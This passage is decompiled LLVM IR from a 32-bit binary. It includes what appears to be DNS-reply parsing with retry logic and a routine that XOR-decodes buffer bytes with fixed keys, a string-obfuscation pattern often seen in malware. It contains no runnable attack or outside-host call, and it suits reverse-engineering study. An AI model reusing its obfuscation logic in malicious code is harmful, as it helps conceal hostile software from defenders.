  %v2_8049426 = inttoptr i32 %v1_8049426 to i32*
  store i32 2048, i32* %v2_8049426, align 4
  %v1_804942b = add i32 %v0_804941b, 68
  store i32 %v1_804942b, i32* %edx.global-to-local, align 4
  %v2_804942f = add i32 %v0_804941b, -12
  %v3_804942f = inttoptr i32 %v2_804942f to i32*
  store i32 %v1_804942b, i32* %v3_804942f, align 4
  %v1_8049430 = add i32 %v0_804941b, 44
  %v2_8049430 = inttoptr i32 %v1_8049430 to i32*
  %v3_8049430 = load i32, i32* %v2_8049430, align 4
  %v5_8049430 = add i32 %v0_804941b, -16
  %v6_8049430 = inttoptr i32 %v5_8049430 to i32*
  store i32 %v3_8049430, i32* %v6_8049430, align 4
  %v0_8049434 = call i32 @function_804b4d3()
  store i32 %v0_8049434, i32* %eax.global-to-local, align 4
  %v0_8049439 = load i32, i32* @esp, align 4
  %v1_804943c = add i32 %v0_8049439, 44
  %v2_804943c = inttoptr i32 %v1_804943c to i32*
  %v3_804943c = load i32, i32* %v2_804943c, align 4
  %v5_804943c = add i32 %v0_8049439, 16
  %v6_804943c = inttoptr i32 %v5_804943c to i32*
  store i32 %v3_804943c, i32* %v6_804943c, align 4
  store i32 %v0_8049434, i32* @ebx, align 4
  %v2_8049442 = call i32 @function_804a688(i32 %v4_80492c4)
  %v0_8049447 = load i32, i32* @esp, align 4
  %v1_8049447 = add i32 %v0_8049447, 16
  %v1_804944a = add i32 %v2_8049442, 17
  store i32 %v1_804944a, i32* %eax.global-to-local, align 4
  %v0_804944d = load i32, i32* @ebx, align 4
  %v7_804944d = icmp ult i32 %v0_804944d, %v1_804944a
  br i1 %v7_804944d, label %dec_label_pc_804954c, label %dec_label_pc_8049455

dec_label_pc_8049455:                             ; preds = %dec_label_pc_8049409
  %v1_8049455 = add i32 %v0_8049447, 80
  store i32 %v1_8049455, i32* @ecx, align 4
  %v2_8049459 = add i32 %v0_8049447, 28
  %v3_8049459 = inttoptr i32 %v2_8049459 to i32*
  store i32 %v1_8049455, i32* %v3_8049459, align 4
  %v0_804945d = load i32, i32* @esp, align 4
  %v0_8049460 = load i32, i32* @ecx, align 4
  %v2_8049460 = add i32 %v0_804945d, -16
  %v3_8049460 = inttoptr i32 %v2_8049460 to i32*
  store i32 %v0_8049460, i32* %v3_8049460, align 4
  %v2_8049461 = call i32 @function_804a688(i32 %v4_80492c4)
  store i32 %v2_8049461, i32* %eax.global-to-local, align 4
  %v1_8049466 = load i32, i32* @esp, align 4
  %v2_8049466 = add i32 %v1_8049466, 28
  %v3_8049466 = inttoptr i32 %v2_8049466 to i32*
  %v4_8049466 = load i32, i32* %v3_8049466, align 4
  %v5_8049466 = add i32 %v4_8049466, %v2_8049461
  store i32 %v5_8049466, i32* %eax.global-to-local, align 4
  %v1_804946a = add i32 %v1_8049466, 16
  %v1_804946d = add i32 %v1_8049466, 48
  %v2_804946d = inttoptr i32 %v1_804946d to i32*
  %v3_804946d = load i32, i32* %v2_804946d, align 4
  store i32 %v3_804946d, i32* %edx.global-to-local, align 4
  %v1_8049471 = add i32 %v1_8049466, 68
  %v2_8049471 = inttoptr i32 %v1_8049471 to i16*
  %v3_8049471 = load i16, i16* %v2_8049471, align 2
  %v5_8049471 = trunc i32 %v3_804946d to i16
  %v16_8049471 = icmp eq i16 %v3_8049471, %v5_8049471
  %v1_8049476 = add i32 %v5_8049466, 5
  store i32 %v1_8049476, i32* @edi, align 4
  %v1_8049479 = icmp eq i1 %v16_8049471, false
  br i1 %v1_8049479, label %dec_label_pc_804954c, label %dec_label_pc_804947f

dec_label_pc_804947f:                             ; preds = %dec_label_pc_8049455
  %v1_804947f = add i32 %v1_8049466, 74
  %v2_804947f = inttoptr i32 %v1_804947f to i16*
  %v3_804947f = load i16, i16* %v2_804947f, align 2
  %v4_804947f = icmp eq i16 %v3_804947f, 0
  br i1 %v4_804947f, label %dec_label_pc_804954c, label %dec_label_pc_804948b

dec_label_pc_804948b:                             ; preds = %dec_label_pc_804947f
  %v1_804948b = add i32 %v5_8049466, 1
  %v2_804948b = inttoptr i32 %v1_804948b to i16*
  %v3_804948b = load i16, i16* %v2_804948b, align 2
  %v2_804948f = call i16 @llvm.bswap.i16(i16 %v3_804948b)
  %v3_804948f = zext i16 %v2_804948f to i32
  %v5_804948f = and i32 %v5_8049466, -65536
  %v6_804948f = or i32 %v3_804948f, %v5_804948f
  store i32 %v6_804948f, i32* %eax.global-to-local, align 4
  %v7_8049493 = icmp eq i16 %v3_804948b, 4096
  %v1_8049497 = icmp eq i1 %v7_8049493, false
  br i1 %v1_8049497, label %dec_label_pc_804954c, label %dec_label_pc_804949d

dec_label_pc_804949d:                             ; preds = %dec_label_pc_804948b
  store i32 0, i32* %ebx.global-to-local, align 4
  %v3_80494a2 = inttoptr i32 %v1_8049466 to i32*
  store i32 %v1_8049476, i32* %v3_80494a2, align 4
  %v2_80494a3 = call i32 @function_804a688(i32 %v4_80492c4)
  store i32 %v2_80494a3, i32* %eax.global-to-local, align 4
  %v0_80494a8 = load i32, i32* @edi, align 4
  store i32 %v0_80494a8, i32* %edx.global-to-local, align 4
  %v0_80494aa = load i32, i32* @esp, align 4
  %v1_80494aa = add i32 %v0_80494aa, 16
  store i32 %v2_80494a3, i32* %esi.global-to-local, align 4
  %v0_80494c93 = load i32, i32* %ebx.global-to-local, align 4
  %v5_80494cb13 = icmp slt i32 %v0_80494c93, %v2_80494a3
  br i1 %v5_80494cb13, label %dec_label_pc_80494b1, label %dec_label_pc_80494cd

dec_label_pc_80494b1:                             ; preds = %dec_label_pc_804949d, %dec_label_pc_80494c8.dec_label_pc_80494b1_crit_edge
  %v1_80494c936 = phi i32 [ %v1_80494c9, %dec_label_pc_80494c8.dec_label_pc_80494b1_crit_edge ], [ %v2_80494a3, %dec_label_pc_804949d ]
  %v4_80494b4 = phi i32 [ %v4_80494b4.pre, %dec_label_pc_80494c8.dec_label_pc_80494b1_crit_edge ], [ %v2_80494a3, %dec_label_pc_804949d ]
  %v1_80494b1 = phi i32 [ %v1_80494c8, %dec_label_pc_80494c8.dec_label_pc_80494b1_crit_edge ], [ %v0_80494c93, %dec_label_pc_804949d ]
  %v0_80494ba = phi i32 [ %v0_80494b1.pre, %dec_label_pc_80494c8.dec_label_pc_80494b1_crit_edge ], [ %v0_80494a8, %dec_label_pc_804949d ]
  %v2_80494b1 = add i32 %v0_80494ba, %v1_80494b1
  store i32 %v2_80494b1, i32* @ecx, align 4
  %v1_80494b4 = inttoptr i32 %v2_80494b1 to i8*
  %v2_80494b4 = load i8, i8* %v1_80494b4, align 1
  %v3_80494b4 = zext i8 %v2_80494b4 to i32
  %v5_80494b4 = and i32 %v4_80494b4, -256
  %v6_80494b4 = or i32 %v3_80494b4, %v5_80494b4
  store i32 %v6_80494b4, i32* %eax.global-to-local, align 4
  %v8_80494b6 = icmp eq i8 %v2_80494b4, -64
  %v1_80494b8 = icmp eq i1 %v8_80494b6, false
  br i1 %v1_80494b8, label %dec_label_pc_80494c4, label %dec_label_pc_80494ba

dec_label_pc_80494ba:                             ; preds = %dec_label_pc_80494b1
  %v1_80494ba = add i32 %v0_80494ba, 1
  %v2_80494ba = inttoptr i32 %v1_80494ba to i8*
  %v3_80494ba = load i8, i8* %v2_80494ba, align 1
  %v4_80494ba = zext i8 %v3_80494ba to i32
  store i32 %v4_80494ba, i32* %eax.global-to-local, align 4
  %v0_80494be = load i32, i32* @esp, align 4
  %v2_80494be = add nuw nsw i32 %v4_80494ba, 51
  %v3_80494be = add i32 %v2_80494be, %v0_80494be
  store i32 %v3_80494be, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80494c8

dec_label_pc_80494c4:                             ; preds = %dec_label_pc_80494b1
  %v2_80494c4 = add i8 %v2_80494b4, 1
  %v14_80494c4 = zext i8 %v2_80494c4 to i32
  %v17_80494c4 = or i32 %v14_80494c4, %v5_80494b4
  store i32 %v17_80494c4, i32* %eax.global-to-local, align 4
  store i8 %v2_80494c4, i8* %v1_80494b4, align 1
  %v0_80494c8.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_80494c9.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80494c8

dec_label_pc_80494c8:                             ; preds = %dec_label_pc_80494ba, %dec_label_pc_80494c4
  %v1_80494c9 = phi i32 [ %v1_80494c936, %dec_label_pc_80494ba ], [ %v1_80494c9.pre, %dec_label_pc_80494c4 ]
  %v0_80494c8 = phi i32 [ %v1_80494b1, %dec_label_pc_80494ba ], [ %v0_80494c8.pre, %dec_label_pc_80494c4 ]
  %v1_80494c8 = add i32 %v0_80494c8, 1
  store i32 %v1_80494c8, i32* %ebx.global-to-local, align 4
  %v5_80494cb = icmp slt i32 %v1_80494c8, %v1_80494c9
  br i1 %v5_80494cb, label %dec_label_pc_80494c8.dec_label_pc_80494b1_crit_edge, label %dec_label_pc_80494c9.dec_label_pc_80494cd_crit_edge

dec_label_pc_80494c8.dec_label_pc_80494b1_crit_edge: ; preds = %dec_label_pc_80494c8
  %v0_80494b1.pre = load i32, i32* %edx.global-to-local, align 4
  %v4_80494b4.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80494b1

dec_label_pc_80494c9.dec_label_pc_80494cd_crit_edge: ; preds = %dec_label_pc_80494c8
  %v0_80494cd.pre = load i32, i32* @edi, align 4
  %v1_80494d7.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80494cd

dec_label_pc_80494cd:                             ; preds = %dec_label_pc_80494c9.dec_label_pc_80494cd_crit_edge, %dec_label_pc_804949d
  %v1_80494d7 = phi i32 [ %v1_80494d7.pre, %dec_label_pc_80494c9.dec_label_pc_80494cd_crit_edge ], [ %v1_80494aa, %dec_label_pc_804949d ]
  %v0_80494d4 = phi i32 [ %v0_80494cd.pre, %dec_label_pc_80494c9.dec_label_pc_80494cd_crit_edge ], [ %v0_80494a8, %dec_label_pc_804949d ]
  %v1_80494cd = add i32 %v0_80494d4, 2
  store i32 %v1_80494cd, i32* @ebx, align 4
  %v1_80494d0 = add i32 %v0_80494d4, 10
  %v2_80494d0 = inttoptr i32 %v1_80494d0 to i16*
  %v3_80494d0 = load i16, i16* %v2_80494d0, align 2
  %v1_80494d4 = add i32 %v0_80494d4, 12
  store i32 %v1_80494d4, i32* @esi, align 4
  %v0_80494d7 = load i32, i32* @ecx, align 4
  %v2_80494d7 = add i32 %v1_80494d7, -4
  %v3_80494d7 = inttoptr i32 %v2_80494d7 to i32*
  store i32 %v0_80494d7, i32* %v3_80494d7, align 4
  %v2_80494d8 = call i16 @llvm.bswap.i16(i16 %v3_80494d0)
  %v3_80494d8 = zext i16 %v2_80494d8 to i32
  %v2_80494df = add i32 %v1_80494d7, -8
  %v3_80494df = inttoptr i32 %v2_80494df to i32*
  store i32 %v3_80494d8, i32* %v3_80494df, align 4
  %v0_80494e0 = load i32, i32* @edi, align 4
  %v1_80494e0 = add i32 %v0_80494e0, 13
  store i32 %v1_80494e0, i32* %eax.global-to-local, align 4
  %v2_80494e3 = add i32 %v1_80494d7, -12
  %v3_80494e3 = inttoptr i32 %v2_80494e3 to i32*
  store i32 %v1_80494e0, i32* %v3_80494e3, align 4
  %v0_80494e4 = load i32, i32* @esi, align 4
  %v2_80494e4 = add i32 %v1_80494d7, -16
  %v3_80494e4 = inttoptr i32 %v2_80494e4 to i32*
  store i32 %v0_80494e4, i32* %v3_80494e4, align 4
  %v5_80494e5 = inttoptr i32 %v4_80492c4 to i8*
  %v6_80494e5 = call i32 @function_804b35a(i8* %v5_80494e5, i32 256, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_80494e5, i32* %eax.global-to-local, align 4
  %v0_80494ea = load i32, i32* @esp, align 4
  %v1_80494ed = add i32 %v0_80494ea, 8
  %v2_80494ed = inttoptr i32 %v1_80494ed to i32*
  store i32 2048, i32* %v2_80494ed, align 4
  %v1_80494f2 = add i32 %v0_80494ea, 4
  %v2_80494f2 = inttoptr i32 %v1_80494f2 to i32*
  store i32 0, i32* %v2_80494f2, align 4
  %v0_80494f4 = load i32, i32* @ebp, align 4
  %v3_80494f4 = inttoptr i32 %v0_80494ea to i32*
  store i32 %v0_80494f4, i32* %v3_80494f4, align 4
  %v6_80494f5 = call i32 @function_804a6fc(i32 %v4_80492c4, i8 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_80494f5, i32* %eax.global-to-local, align 4
  %v0_80494fa = load i32, i32* @ebx, align 4
  %v1_80494fa = add i32 %v0_80494fa, 8
  %v2_80494fa = inttoptr i32 %v1_80494fa to i16*
  %v3_80494fa = load i16, i16* %v2_80494fa, align 2
  %v0_80494fe = load i32, i32* @esp, align 4
  %v2_8049501 = call i16 @llvm.bswap.i16(i16 %v3_80494fa)
  %v3_8049501 = zext i16 %v2_8049501 to i32
  %v1_8049508 = add nsw i32 %v3_8049501, -1
  store i32 %v1_8049508, i32* %eax.global-to-local, align 4
  %v2_8049509 = add i32 %v0_80494fe, 8
  %v3_8049509 = inttoptr i32 %v2_8049509 to i32*
  store i32 %v1_8049508, i32* %v3_8049509, align 4
  %v0_804950a = load i32, i32* @esi, align 4
  %v2_804950a = add i32 %v0_80494fe, 4
  %v3_804950a = inttoptr i32 %v2_804950a to i32*
  store i32 %v0_804950a, i32* %v3_804950a, align 4
  %v0_804950b = load i32, i32* @ebp, align 4
  %v3_804950b = inttoptr i32 %v0_80494fe to i32*
  store i32 %v0_804950b, i32* %v3_804950b, align 4
  %v5_804950c = call i32 @function_804a6b7(i32 %v4_80492c4, i32 256, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804950c, i32* %eax.global-to-local, align 4
  %v0_8049511 = load i32, i32* @esp, align 4
  %v1_8049511 = add i32 %v0_8049511, 52
  %v2_8049511 = inttoptr i32 %v1_8049511 to i8*
  %v3_8049511 = load i8, i8* %v2_8049511, align 1
  %v4_8049511 = zext i8 %v3_8049511 to i32
  %v5_8049511 = load i32, i32* @ecx, align 4
  %v6_8049511 = and i32 %v5_8049511, -256
  %v7_8049511 = or i32 %v6_8049511, %v4_8049511
  store i32 %v7_8049511, i32* @ecx, align 4
  %v2_8049515 = load i32, i32* @ebp, align 4
  %v3_8049515 = add i32 %v2_8049515, 2052
  %v4_8049515 = inttoptr i32 %v3_8049515 to i8*
  store i8 %v3_8049511, i8* %v4_8049515, align 1
  %v0_804951b = load i32, i32* @edi, align 4
  %v1_804951b = add i32 %v0_804951b, 2
  %v2_804951b = inttoptr i32 %v1_804951b to i16*
  %v3_804951b = load i16, i16* %v2_804951b, align 2
  %v2_804951f = call i16 @llvm.bswap.i16(i16 %v3_804951b)
  %v3_804951f = zext i16 %v2_804951f to i32
  %v5_804951f = and i32 %v5_804950c, -65536
  %v6_804951f = or i32 %v3_804951f, %v5_804951f
  store i32 %v6_804951f, i32* %eax.global-to-local, align 4
  %v2_8049523 = load i32, i32* @ebp, align 4
  %v3_8049523 = add i32 %v2_8049523, 2048
  %v4_8049523 = inttoptr i32 %v3_8049523 to i16*
  store i16 %v2_804951f, i16* %v4_8049523, align 2
  %v0_804952a = load i32, i32* @ebx, align 4
  %v1_804952a = add i32 %v0_804952a, 2
  %v2_804952a = inttoptr i32 %v1_804952a to i16*
  %v3_804952a = load i16, i16* %v2_804952a, align 2
  %v5_804952a = load i32, i32* %eax.global-to-local, align 4
  %v2_804952e = call i16 @llvm.bswap.i16(i16 %v3_804952a)
  %v3_804952e = zext i16 %v2_804952e to i32
  %v5_804952e = and i32 %v5_804952a, -65536
  %v6_804952e = or i32 %v3_804952e, %v5_804952e
  store i32 %v6_804952e, i32* %eax.global-to-local, align 4
  %v2_8049532 = load i32, i32* @ebp, align 4
  %v3_8049532 = add i32 %v2_8049532, 2050
  %v4_8049532 = inttoptr i32 %v3_8049532 to i16*
  store i16 %v2_804952e, i16* %v4_8049532, align 2
  %v0_8049539 = load i32, i32* @esi, align 4
  %v1_8049539 = load i32, i32* @esp, align 4
  %v2_8049539 = inttoptr i32 %v1_8049539 to i32*
  store i32 %v0_8049539, i32* %v2_8049539, align 4
  %v2_804953c = call i32 @function_804a688(i32 %v4_80492c4)
  %v3_804953c = trunc i32 %v2_804953c to i8
  store i32 %v2_804953c, i32* @eax, align 4
  %v3_8049544 = load i32, i32* @ebp, align 4
  %v4_8049544 = add i32 %v3_8049544, 2053
  %v5_8049544 = inttoptr i32 %v4_8049544 to i8*
  store i8 %v3_804953c, i8* %v5_8049544, align 1
  %v0_8049563.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049563

dec_label_pc_804954c:                             ; preds = %dec_label_pc_804948b, %dec_label_pc_804947f, %dec_label_pc_8049455, %dec_label_pc_8049409, %dec_label_pc_80493f6, %dec_label_pc_80493ee, %dec_label_pc_8049358
  %v1_8049558 = phi i32 [ %v1_804946a, %dec_label_pc_804948b ], [ %v1_804946a, %dec_label_pc_804947f ], [ %v1_804946a, %dec_label_pc_8049455 ], [ %v1_8049447, %dec_label_pc_8049409 ], [ %v1_80493e2, %dec_label_pc_80493f6 ], [ %v1_80493e2, %dec_label_pc_80493ee ], [ %v1_8049362, %dec_label_pc_8049358 ]
  %v1_804954c = add i32 %v1_8049558, 36
  %v2_804954c = inttoptr i32 %v1_804954c to i32*
  %v3_804954c = load i32, i32* %v2_804954c, align 4
  %v1_8049550 = add i32 %v3_804954c, 1
  %v1_8049551 = urem i32 %v1_8049550, 65536
  store i32 %v1_8049551, i32* @eax, align 4
  %v1_8049554 = trunc i32 %v1_8049550 to i16
  %v10_8049554 = icmp eq i16 %v1_8049554, 11
  store i32 %v1_8049551, i32* %v2_804954c, align 4
  br i1 %v10_8049554, label %dec_label_pc_8049579, label %dec_label_pc_80492ef

dec_label_pc_8049563:                             ; preds = %dec_label_pc_804936a, %dec_label_pc_80494cd
  %v0_8049563 = phi i32 [ %v0_8049563.pre, %dec_label_pc_80494cd ], [ %v1_80493e2, %dec_label_pc_804936a ]
  %v1_8049566 = add i32 %v0_8049563, -16
  %v2_8049566 = inttoptr i32 %v1_8049566 to i32*
  store i32 25, i32* %v2_8049566, align 4
  %v2_8049568 = trunc i64 %v11_8049252 to i8
  %v3_8049568 = call i32 @function_804820a(i8 %v2_8049568)
  store i32 %v3_8049568, i32* %eax.global-to-local, align 4
  %v0_804956d = load i32, i32* @esp, align 4
  %v1_804956d = inttoptr i32 %v0_804956d to i32*
  %v2_804956d = load i32, i32* %v1_804956d, align 4
  store i32 %v2_804956d, i32* %edx.global-to-local, align 4
  %v1_804956e = add i32 %v0_804956d, 44
  %v2_804956e = inttoptr i32 %v1_804956e to i32*
  %v3_804956e = load i32, i32* %v2_804956e, align 4
  store i32 %v3_804956e, i32* %v1_804956d, align 4
  %v2_8049572 = call i32 @function_804ae74(i32 %v4_80492c4)
  br label %dec_label_pc_804958f

dec_label_pc_8049579:                             ; preds = %dec_label_pc_804954c
  %v0_8049579 = load i32, i32* @esp, align 4
  store i32 0, i32* @ebp, align 4
  %v1_804957e = add i32 %v0_8049579, -16
  %v2_804957e = inttoptr i32 %v1_804957e to i32*
  store i32 25, i32* %v2_804957e, align 4
  %v2_8049580 = trunc i64 %v11_8049252 to i8
  %v3_8049580 = call i32 @function_804820a(i8 %v2_8049580)
  store i32 %v3_8049580, i32* %eax.global-to-local, align 4
  %v0_8049585 = load i32, i32* @esp, align 4
  %v1_8049585 = inttoptr i32 %v0_8049585 to i32*
  %v2_8049585 = load i32, i32* %v1_8049585, align 4
  store i32 %v2_8049585, i32* %eax.global-to-local, align 4
  %v1_8049586 = add i32 %v0_8049585, 44
  %v2_8049586 = inttoptr i32 %v1_8049586 to i32*
  %v3_8049586 = load i32, i32* %v2_8049586, align 4
  store i32 %v3_8049586, i32* %v1_8049585, align 4
  %v2_804958a = call i32 @function_804ae74(i32 %v4_80492c4)
  br label %dec_label_pc_804958f

dec_label_pc_804958f:                             ; preds = %dec_label_pc_8049563, %dec_label_pc_8049579
  %v0_804958f = load i32, i32* @esp, align 4
  %v1_804958f = add i32 %v0_804958f, 4316
  %v0_8049595 = load i32, i32* @ebp, align 4
  store i32 %v0_8049595, i32* %eax.global-to-local, align 4
  %v1_8049597 = inttoptr i32 %v1_804958f to i32*
  %v2_8049597 = load i32, i32* %v1_8049597, align 4
  store i32 %v2_8049597, i32* @ebx, align 4
  %v3_8049597 = add i32 %v0_804958f, 4320
  %v1_8049598 = inttoptr i32 %v3_8049597 to i32*
  %v2_8049598 = load i32, i32* %v1_8049598, align 4
  store i32 %v2_8049598, i32* @esi, align 4
  %v3_8049598 = add i32 %v0_804958f, 4324
  %v1_8049599 = inttoptr i32 %v3_8049598 to i32*
  %v2_8049599 = load i32, i32* %v1_8049599, align 4
  store i32 %v2_8049599, i32* @edi, align 4
  %v3_8049599 = add i32 %v0_804958f, 4328
  %v1_804959a = inttoptr i32 %v3_8049599 to i32*
  %v2_804959a = load i32, i32* %v1_804959a, align 4
  store i32 %v2_804959a, i32* @ebp, align 4
  ret i32 %v0_8049595

; uselistorder directives
  uselistorder i32 %v1_8049551, { 1, 0 }
  uselistorder i32 %v1_8049550, { 1, 0 }
  uselistorder i32 %v2_804953c, { 1, 0 }
  uselistorder i32 %v0_80494fe, { 2, 0, 1 }
  uselistorder i32 %v0_80494d4, { 0, 2, 1 }
  uselistorder i32 %v1_80494c8, { 1, 2, 0 }
  uselistorder i8 %v2_80494b4, { 1, 0, 2 }
  uselistorder i32 %v0_80494ba, { 1, 0 }
  uselistorder i32 %v1_80494b1, { 1, 0 }
  uselistorder i32 %v0_80494a8, { 1, 0, 2 }
  uselistorder i32 %v2_80494a3, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v5_8049466, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8049466, { 0, 1, 4, 3, 2, 5 }
  uselistorder i32 %v7_80493dd, { 2, 1, 0, 3 }
  uselistorder i32 %v1_80493a8, { 1, 0 }
  uselistorder i32 %v2_80493a5, { 1, 0 }
  uselistorder i32 %v1_804938a, { 2, 0, 1, 3 }
  uselistorder i32 %v12_804937b, { 1, 0 }
  uselistorder i32 %v0_8049378, { 3, 0, 1, 2 }
  uselistorder i32 %v0_804934f, { 5, 1, 2, 3, 4, 0, 6 }
  uselistorder i32 %v0_804934a, { 1, 0, 2 }
  uselistorder i32 %v0_804932f, { 0, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_8049315, { 0, 6, 1, 2, 3, 4, 5 }
  uselistorder i32 %v1_8049305, { 3, 2, 1, 0 }
  uselistorder i32 %v4_80492c4, { 14, 9, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11, 12, 15, 13, 16, 0, 17 }
  uselistorder i64 %v11_8049252, { 1, 0, 2 }
  uselistorder i32 %v1_8049231, { 1, 2, 0 }
  uselistorder i32 %v1_8049222, { 0, 2, 3, 1 }
  uselistorder i32 %v0_804920d, { 1, 2, 0 }
  uselistorder i32 %v2_8049217, { 1, 0 }
  uselistorder i32 %v2_80491ea, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32 %v2_80491db, { 3, 0, 5, 1, 6, 4, 7, 2, 8, 9, 10 }
  uselistorder i32* %esi.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i32* %edx.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 0, 43, 44, 45 }
  uselistorder i64 65535, { 1, 0 }
  uselistorder label %dec_label_pc_804958f, { 1, 0 }
  uselistorder label %dec_label_pc_8049563, { 1, 0 }
  uselistorder label %dec_label_pc_80494c8, { 1, 0 }
  uselistorder label %dec_label_pc_80494b1, { 1, 0 }
  uselistorder label %dec_label_pc_8049305, { 1, 0 }
  uselistorder label %dec_label_pc_8049231, { 1, 0 }
  uselistorder label %dec_label_pc_804921b, { 1, 0 }
  uselistorder label %dec_label_pc_8049205, { 1, 0 }
}

define i32 @function_804959c() local_unnamed_addr {
dec_label_pc_804959c:
  %v0_80495a1 = load i32, i32* @global_var_804f69c.44, align 4
  %v2_80495a7 = call i32 @function_804af6b(i32 %v0_80495a1, i32 9)
  ret i32 %v2_80495a7
}

define i32 @function_80495b0() local_unnamed_addr {
dec_label_pc_80495b0:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80495b0 = load i32, i32* @ebp, align 4
  %v0_80495b1 = load i32, i32* @eax, align 4
  %v1_80495b1 = urem i32 %v0_80495b1, 65536
  store i32 %v1_80495b1, i32* @ebp, align 4
  %v0_80495b4 = load i32, i32* @edi, align 4
  %v0_80495b5 = load i32, i32* @esi, align 4
  %v0_80495b6 = load i32, i32* @ecx, align 4
  store i32 %v0_80495b6, i32* @esi, align 4
  %v0_80495b8 = load i32, i32* @ebx, align 4
  store i32 %v0_80495b8, i32* %stack_var_-16, align 4
  %v0_80495b9 = load i32, i32* @edx, align 4
  store i32 %v0_80495b9, i32* @ebx, align 4
  store i32 12, i32* %stack_var_-44, align 4
  %v1_80495c0 = call i32 @function_804b6c8(i32 12)
  %v2_80495c0 = inttoptr i32 %v1_80495c0 to i16*
  store i32 %v1_80495c0, i32* %eax.global-to-local, align 4
  %v0_80495c5 = load i32, i32* @ebp, align 4
  %v1_80495c5 = trunc i32 %v0_80495c5 to i16
  store i16 %v1_80495c5, i16* %v2_80495c0, align 2
  store i32 %v1_80495c0, i32* @edi, align 4
  %v0_80495ca = load i32, i32* @ebx, align 4
  %v1_80495ca = trunc i32 %v0_80495ca to i8
  %v4_80495ca = add i32 %v1_80495c0, 2
  %v5_80495ca = inttoptr i32 %v4_80495ca to i8*
  store i8 %v1_80495ca, i8* %v5_80495ca, align 1
  %v0_80495cd = load i32, i32* @ebp, align 4
  store i32 %v0_80495cd, i32* %stack_var_-44, align 4
  %v1_80495d0 = call i32 @function_804b6c8(i32 %v0_80495cd)
  store i32 %v1_80495d0, i32* %eax.global-to-local, align 4
  %v0_80495d8 = load i32, i32* @ebp, align 4
  %v0_80495d9 = load i32, i32* @esi, align 4
  store i32 %v1_80495d0, i32* %stack_var_-44, align 4
  %v1_80495db = load i32, i32* @edi, align 4
  %v2_80495db = add i32 %v1_80495db, 4
  %v3_80495db = inttoptr i32 %v2_80495db to i32*
  store i32 %v1_80495d0, i32* %v3_80495db, align 4
  %v0_80495de = load i32, i32* %stack_var_-44, align 4
  %v3_80495de = call i32 @function_804a6b7(i32 %v0_80495de, i32 %v0_80495d9, i32 %v0_80495d8)
  store i32 %v3_80495de, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_804960b2 = load i32, i32* @ebp, align 4
  %v5_804960d11 = icmp sgt i32 %v1_804960b2, 0
  br i1 %v5_804960d11, label %dec_label_pc_80495ea, label %dec_label_pc_804960f

dec_label_pc_80495ea:                             ; preds = %dec_label_pc_80495b0, %dec_label_pc_80495ea
  %v0_80495ea = phi i32 [ %v0_804960b, %dec_label_pc_80495ea ], [ 0, %dec_label_pc_80495b0 ]
  store i32 %v0_80495ea, i32* %eax.global-to-local, align 4
  %v1_80495ec = load i32, i32* @edi, align 4
  %v2_80495ec = add i32 %v1_80495ec, 4
  %v3_80495ec = inttoptr i32 %v2_80495ec to i32*
  %v4_80495ec = load i32, i32* %v3_80495ec, align 4
  %v5_80495ec = add i32 %v4_80495ec, %v0_80495ea
  store i32 %v5_80495ec, i32* %eax.global-to-local, align 4
  %v1_80495ef = inttoptr i32 %v5_80495ec to i8*
  %v2_80495ef = load i8, i8* %v1_80495ef, align 1
  %v3_80495ef = xor i8 %v2_80495ef, -19
  store i8 %v3_80495ef, i8* %v1_80495ef, align 1
  %v0_80495f2 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_80495f2, i32* %eax.global-to-local, align 4
  %v1_80495f4 = load i32, i32* @edi, align 4
  %v2_80495f4 = add i32 %v1_80495f4, 4
  %v3_80495f4 = inttoptr i32 %v2_80495f4 to i32*
  %v4_80495f4 = load i32, i32* %v3_80495f4, align 4
  %v5_80495f4 = add i32 %v4_80495f4, %v0_80495f2
  store i32 %v5_80495f4, i32* %eax.global-to-local, align 4
  %v1_80495f7 = inttoptr i32 %v5_80495f4 to i8*
  %v2_80495f7 = load i8, i8* %v1_80495f7, align 1
  %v3_80495f7 = xor i8 %v2_80495f7, -22
  store i8 %v3_80495f7, i8* %v1_80495f7, align 1
  %v0_80495fa = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_80495fa, i32* %eax.global-to-local, align 4
  %v1_80495fc = load i32, i32* @edi, align 4
  %v2_80495fc = add i32 %v1_80495fc, 4
  %v3_80495fc = inttoptr i32 %v2_80495fc to i32*
  %v4_80495fc = load i32, i32* %v3_80495fc, align 4
  %v5_80495fc = add i32 %v4_80495fc, %v0_80495fa
  store i32 %v5_80495fc, i32* %eax.global-to-local, align 4
  %v1_80495ff = inttoptr i32 %v5_80495fc to i8*
  %v2_80495ff = load i8, i8* %v1_80495ff, align 1
  %v3_80495ff = xor i8 %v2_80495ff, -34
  store i8 %v3_80495ff, i8* %v1_80495ff, align 1
  %v0_8049602 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8049602, i32* %eax.global-to-local, align 4
  %v1_8049604 = add i32 %v0_8049602, 1
  store i32 %v1_8049604, i32* %edx.global-to-local, align 4
  %v1_8049605 = load i32, i32* @edi, align 4
